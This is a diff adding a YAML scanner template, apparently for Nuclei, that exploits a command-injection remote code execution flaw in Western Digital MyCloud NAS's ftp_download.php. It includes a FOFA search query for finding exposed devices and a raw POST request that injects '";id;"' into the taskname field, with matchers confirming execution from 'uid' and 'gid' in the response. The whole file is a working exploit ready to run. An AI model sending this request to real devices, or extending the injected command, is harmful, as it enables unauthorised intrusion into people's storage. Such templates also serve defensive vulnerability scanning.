@@ -1,0 +1,32 @@
+id: western-digital-ftp_download-command-exec
+
+info:
+  name: "西部数据ftp_download.php 远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-1074357885"&& header="X-Powered-By: PHP/5.4.16"
+          Western Digital MyCloud NAS是一款网络附加存储设备,旨在提供集中存储和共享解决方案。该设备通过网络协议支持多端文件访问与备份功能。在ftp_download.php脚本处理文件传输请求时，未正确验证用户输入参数，允许攻击者通过构造恶意输入触发远程代码执行
+  tags: 西部数据
+
+http:
+- raw:
+  - |
+    POST /web/addons/ftp_download.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+
+    action=create&taskname=";id;"&host=127.0.0.1&user=test&pwd=test&dest_dir=/tmp&schedule=0&lang=en
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
+  - type: word
+    part: body
+    words:
+    - 'gid'
